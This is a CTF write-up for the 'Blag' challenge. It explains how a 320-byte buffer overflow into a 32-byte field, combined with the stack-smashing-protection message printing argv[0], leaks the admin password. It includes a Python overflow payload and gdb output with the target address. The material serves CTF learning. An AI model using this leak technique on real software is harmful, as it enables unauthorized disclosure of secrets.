# Blag (180 points)


###Problem overview:

  You're given a binary for a blog server that has a bug. You must exploit this bug to get the flag out of the admin's post, which the server won't let you read under normal circumstances.
  
###The process:
   I'll have to admit, this one had me stumped until the last two hours of the competition
I spent probably 5 or 6 hours in total looking at the source. I found the initial buffer overflow within about 10 minutes, but I didn't know what to do with it.
   
```C
52:  readline(buf,sizeof(p->body),stdin); //buffer overflow 320 -> 32
```
   
Despite my initial hopes, this buffer overflow proved to be useless (or did it?) due to   ProPolice Stack Smashing Protection (SSP). I'm sure a lot of you saw this:
```
*** stack smashing detected ***: ./blag_0eef9b24c4a119def3a50a6095b43d952dbf77206da9a95886a3d3e0a76fee42 terminated
```
   
   
  I gave up on this problem on the first day and came back to it with ~4 hours left in the competition. My teammates and I combed through the source again, and we concluded that the aforementioned buffer overflow was the only vulnerability in the program. I tried to overflow the buffer again, but this time with the full overflow size (320 bytes), and this time I got somthing interesting

```
$ python -c 'print "add\n" + "a\n" +"a\n" + "A"*320 + "\n"' | ./blag_0eef9b24c4a119def3a50a6095b43d952dbf77206da9a95886a3d3e0a76fee42

...
...


Segmentation fault (core dumped)
```

  For those of you who looked at the disassembly of the functions, this should surprise you. If the stack canary is not preserved (AKA if you overflow),then the program calls another function that aborts the program. This means that the segfault above has to have occurred somewhere in SSP's own code. Armed with this information, I got my google-fu on.
  
  I found [this pdf](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf) from Dragon Sector, a collegiate/professional CTF team. Incidentally, it also has the solution to [oneshot](oneshot_170_pts.md) in it. As it turns out, the error message from above gets the name of the program from the `argv` variable. We can overflow the pointer to this with the pointer to some other random string that we need. Namely the admin password.
  
```
$ gdb -q ./blag_0eef9b24c4a119def3a50a6095b43d952dbf77206da9a95886a3d3e0a76fee42
Reading symbols from ./blag_0eef9b24c4a119def3a50a6095b43d952dbf77206da9a95886a3d3e0a76fee42...(no debugging symbols found)...done.
gdb-peda$ p &adminpassword
$1 = (<data variable, no debug info> *) 0x804b080 <adminpassword>
gdb-peda$ q
$ $ python -c 'print "add\na\na\n"+"\x80\xb0\x04\x08"*76' | ./blag_0eef9b24c4a119def3a50a6095b43d952dbf77206da9a95886a3d3e0a76fee42
...
...
*** stack smashing detected ***: meme terminated
```

I picked 'meme' as my local admin password, but if you tried it remotely you would get the real admin password. From there you can just authorize yourself and get the flag!!



